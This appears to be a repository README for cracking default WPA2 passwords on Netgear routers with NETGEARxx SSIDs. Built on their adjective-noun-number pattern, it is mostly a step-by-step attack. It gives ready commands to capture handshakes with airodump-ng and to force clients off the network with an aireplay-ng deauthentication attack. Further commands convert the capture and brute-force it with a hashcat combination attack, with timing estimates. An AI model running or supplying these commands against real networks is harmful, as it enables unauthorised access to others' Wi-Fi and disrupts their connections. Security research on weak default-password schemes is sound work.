
# Network WPA Wordlist

A wordlist for targeting netgear router default WPA2 passwords

Many Netgear routers with the SSID of `NETGEARxx` where xx is a two digit number have a default Wi-Fi password that follows the following pattern:
```
[english adjective][english noun][3 digit number]
```

Security researchers have noted that this password scheme does not provide a suffient ammount of entropy to generate secure Wi-Fi passwords.

## Generating Wordlist

In order to optimize wordlist file sizes, we will use two wordlists to feed into hashcat's Combination attack mode.

The first wordlist will be a list of 5000 adjectives.
- top\_english\_adjs\_lower\_5000.txt

The second wordlist will be a list of all combinations of a list of 10000 nouns with all possible 3 digit numbers.
Not wanting to commit a 106M wordlist to this repo, we will use the included python script to generate the second wordlist file:
- nouns-numbers.txt
```
generate-nouns-numbers.py
```

## Capturing WPA 4-way Handshake

save 4-way handshake to pcap:
```
sudo airodump-ng wlan0 --essid-regex NETGEAR[1-9]{2} -w psk
```

deauth client connected to targeted access point to get a handshake
```
sudo aireplay-ng -0 1 -a <AP MAC> -c <CLIENT MAC> wlan0
```

convert pcap to hashcat format
```
hcxpcapngtool -o hash.hc22000 -E wordlist psk-01.cap
```

## Cracking WPA Password Hash

hashcat Combination attack mode
```
hashcat -m 22000 -a 1 hash.hc22000 top_english_adjs_lower_5000.txt nouns-n-numbers.txt
```

## Math & Benchmarking

- 2080TI able to average 125100 hashes per second
- nouns-n-numbers.txt size: 10000000 lines
- top\_english\_adjs\_lower\_5000.txt size: 5000 lines
- total number of guesses = 50000000000 = 10000000 * 5000
- time to crack all possible passwords = 50000000000 guesses / 125100 hashes/second = 399680 seconds = 111 hours = 4.6 days

## References

- https://github.com/3mrgnc3/RouterKeySpaceWordlists
- https://www.aircrack-ng.org/doku.php?id=cracking\_wpa
- https://github.com/david47k/top-english-wordlists
- https://hashcat.net/forum/thread-7443-post-40036.html#pid40036
